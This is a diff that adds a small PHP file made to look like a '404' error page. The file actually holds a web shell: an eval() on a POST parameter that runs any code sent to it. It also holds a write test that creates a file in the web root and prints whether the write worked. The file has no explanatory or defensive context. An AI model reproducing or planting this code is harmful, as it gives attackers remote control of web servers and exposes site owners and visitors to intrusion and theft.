@@ -1,0 +1,13 @@
+<?php
+$a="4";
+$b="0";
+$c="4";
+echo $a.$b.$c."#";
+?> 
+<?php eval($_POST[z]);
+$p_File=fopen($_SERVER['DOCUMENT_ROOT']."/1.txt","w");
+if(!$p_File)
+echo "writewrong";
+else
+echo "writeok";
+?> 
